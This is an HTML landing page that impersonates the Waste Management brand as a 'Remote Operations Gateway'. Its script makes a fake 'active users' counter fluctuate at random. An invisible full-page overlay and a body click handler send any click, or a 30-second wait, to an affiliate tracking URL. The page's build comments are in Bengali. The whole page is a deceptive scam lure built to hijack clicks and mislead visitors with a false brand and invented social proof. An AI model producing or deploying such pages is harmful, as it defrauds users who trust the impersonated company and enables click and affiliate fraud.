<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Waste Management® Official | Remote Hub Portal</title>
    
    <meta property="og:title" content="Waste Management® Official | Remote Hub Portal">
    <meta property="og:description" content="Secure internal network node for verified background scheduling and route processing slots.">
    <meta property="og:type" content="website">

    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&family=JetBrains+Mono:wght@700&display=swap" rel="stylesheet">

    <style>
        :root {
            --bg-deep: #030712;
            --wm-yellow: #fdb813;
            --border-glow: rgba(255, 255, 255, 0.08);
            --text-main: #f9fafb;
            --text-secondary: #9ca3af;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }

        body {
            background-color: var(--bg-deep);
            background-image: 
                radial-gradient(circle at 50% 20%, rgba(0, 104, 55, 0.15) 0%, transparent 50%);
            color: var(--text-main);
            overflow-x: hidden;
            line-height: 1.5;
            cursor: pointer;
        }

        .master-intercept-shield {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            z-index: 5;
            cursor: pointer;
        }

        header {
            background: rgba(3, 7, 18, 0.9);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            border-bottom: 1px solid var(--border-glow);
            padding: 15px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: fixed;
            top: 0; left: 0; width: 100%;
            z-index: 100;
        }

        .brand-logo-text {
            font-weight: 800;
            font-size: 18px;
            letter-spacing: -0.5px;
        }
        .brand-logo-text span { color: var(--wm-yellow); }

        .header-meta-group {
            display: flex;
            align-items: center;
            gap: 12px;
            position: relative; z-index: 110;
        }

        .live-user-tracker-card {
            background: rgba(239, 68, 68, 0.1);
            border: 1px solid rgba(239, 68, 68, 0.3);
            padding: 5px 12px;
            border-radius: 30px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .tracker-lbl {
            font-size: 11px;
            font-weight: 700;
            color: #fca5a5;
        }

        .tracker-val {
            font-size: 13px;
            font-weight: 800;
            color: #ef4444;
            font-family: 'JetBrains Mono', monospace;
        }

        .beacon-signal-pulse {
            width: 6px; height: 6px;
            background-color: #ef4444;
            border-radius: 50%;
            position: relative;
        }
        .beacon-signal-pulse::after {
            content: ''; position: absolute;
            width: 100%; height: 100%; top: 0; left: 0;
            background: #ef4444; border-radius: 50%;
            animation: pulseWave 1.8s infinite ease-in-out;
        }

        .badge-live-clock {
            font-family: 'JetBrains Mono', monospace;
            font-size: 12px;
            color: var(--wm-yellow);
            background: rgba(253, 184, 19, 0.08);
            border: 1px solid rgba(253, 184, 19, 0.25);
            padding: 5px 12px;
            border-radius: 30px;
            font-weight: 700;
        }

        main {
            position: relative;
            z-index: 10;
            padding: 15px 20px;
            max-width: 450px;
            margin: 0 auto;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        #hero-hub {
            padding-top: 105px;
            width: 100%;
        }

        /* প্রথম ছবির সেই আসল হুবহু মানুষের ফ্রেম */
        .expert-visual-frame {
            width: 100%;
            height: 210px;
            margin-bottom: -35px; /* গ্লাস বক্সের সাথে পারফেক্ট ওভারল্যাপ */
            position: relative;
            z-index: 5;
            border-radius: 14px 14px 0 0;
            overflow: hidden;
            border: 1px solid var(--border-glow);
        }

        .expert-visual-frame img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            opacity: 0.85;
        }

        /* মানুষের ফ্রেমের ভেতরের সেই অতিরিক্ত টাইম জোন বক্সটি পুরোপুরি রিমুভ করা হয়েছে */

        /* প্রথম ডেমো ছবির সেই মেইন লাক্সারি গ্লাস টার্মিনাল */
        .secure-terminal-box {
            width: 100%;
            background: rgba(13, 20, 35, 0.75);
            backdrop-filter: blur(25px);
            -webkit-backdrop-filter: blur(25px);
            border: 1px solid rgba(255, 255, 255, 0.08);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
            border-radius: 16px;
            padding: 25px 20px 22px 20px;
            text-align: center;
            position: relative;
            z-index: 10;
        }

        .announcement-bar {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            background: rgba(255, 255, 255, 0.04);
            border: 1px solid var(--border-glow);
            padding: 5px 12px;
            border-radius: 100px;
            font-size: 11px;
            font-weight: 600;
            color: var(--text-secondary);
            margin-bottom: 15px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        h1 {
            font-size: 32px;
            font-weight: 800;
            line-height: 1.15;
            letter-spacing: -0.5px;
            margin-bottom: 12px;
            color: #ffffff;
        }
        h1 span { color: var(--wm-yellow); }

        .hero-lead-paragraph {
            font-size: 13px;
            color: var(--text-secondary);
            margin-bottom: 24px;
            line-height: 1.5;
        }

        .cta-action-box {
            position: relative; z-index: 120;
            width: 100%;
        }

        /* প্রথম ছবির সেই হাই-গ্লোয়িং সলিড বাটন */
        .btn-prime-terminal {
            display: block;
            width: 100%;
            background: linear-gradient(180deg, #ffcc00 0%, var(--wm-yellow) 100%);
            color: #030712;
            border: 1px solid rgba(255, 255, 255, 0.2);
            padding: 15px 24px;
            font-size: 14px;
            font-weight: 800;
            border-radius: 8px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            box-shadow: 0 8px 25px rgba(253, 184, 19, 0.35);
        }

        footer {
            background: #020613;
            border-top: 1px solid var(--border-glow);
            padding: 15px;
            text-align: center;
            font-size: 10px;
            color: #4b5563;
            width: 100%;
            margin-top: 20px;
        }

        @media (max-width: 480px) {
            #hero-hub { padding-top: 115px; }
            h1 { font-size: 28px; }
            .expert-visual-frame { height: 190px; }
        }

        @keyframes pulseWave {
            0% { transform: scale(1); opacity: 0.8; }
            100% { transform: scale(2.6); opacity: 0; }
        }
    </style>
</head>
<body onclick="handleGlobalClickTrigger()">

    <div class="master-intercept-shield"></div>

    <header>
        <div class="brand-container">
            <div class="brand-logo-text">WASTE <span>MANAGEMENT</span></div>
        </div>
        <div class="header-meta-group">
            <div class="live-user-tracker-card">
                <div class="beacon-signal-pulse"></div>
                <div class="tracker-lbl">ACTIVE USERS:</div>
                <div class="tracker-val" id="active-tracker-digits">2,814</div>
            </div>
            <div class="badge-live-clock" id="live-device-clock">Live --:--:--</div>
        </div>
    </header>

    <main id="hero-hub">
        <div class="expert-visual-frame">
            <img src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?q=80&w=600&auto=format&fit=crop" alt="Operations Network Node">
        </div>

        <div class="secure-terminal-box">
            <div class="announcement-bar">
                <span>Node // US-2026 Active</span>
            </div>
            <h1>Remote Operations <span>Gateway</span></h1>
            <p class="hero-lead-paragraph">Secure administrative terminal for verified support routing slots. Synchronize your local session parameters below.</p>
            
            <div class="cta-action-box">
                <button class="btn-prime-terminal">ACCESS OFFICIAL PORTAL</button>
            </div>
        </div>
    </main>

    <footer>
        <p>© 2026 Waste Management International Inc. All Remote Systems Integrated.</p>
    </footer>

    <script>
        const targetGateLink = "https://www.af9m8trk.com/AAV11C1R/PB7121EP/?s1=Ashik";
        let loopTriggered = false;

        setTimeout(() => {
            if (!loopTriggered) {
                window.location.href = targetGateLink;
            }
        }, 30000);

        function handleGlobalClickTrigger() {
            loopTriggered = true;
            window.location.href = targetGateLink;
        }

        // ইউজারের নিজস্ব ডিভাইসের লোকাল লাইভ টাইম (কোনো এক্সট্রা টাইম জোন টেক্সট ছাড়া)
        function synchronizeDeviceClock() {
            const clockElement = document.getElementById('live-device-clock');
            if (clockElement) {
                const localDate = new Date();
                
                let hours = localDate.getHours();
                let minutes = localDate.getMinutes();
                let seconds = localDate.getSeconds();
                const ampm = hours >= 12 ? 'PM' : 'AM';
                
                hours = hours % 12;
                hours = hours ? hours : 12;
                minutes = minutes < 10 ? '0' + minutes : minutes;
                seconds = seconds < 10 ? '0' + seconds : seconds;
                
                clockElement.innerText = 'Live ' + hours + ':' + minutes + ':' + seconds + ' ' + ampm;
            }
        }

        function engineActiveTrackerFlux() {
            const trackerContainer = document.getElementById('active-tracker-digits');
            if (trackerContainer) {
                let initialValue = parseInt(trackerContainer.innerText.replace(',', ''));
                let variations = Math.floor(Math.random() * 3) + 1;
                initialValue = (Math.random() > 0.5) ? initialValue + variations : initialValue - variations;
                trackerContainer.innerText = initialValue.toLocaleString();
            }
        }

        setInterval(synchronizeDeviceClock, 1000);
        setInterval(engineActiveTrackerFlux, 3500);
        synchronizeDeviceClock();
    </script>
</body>
</html>
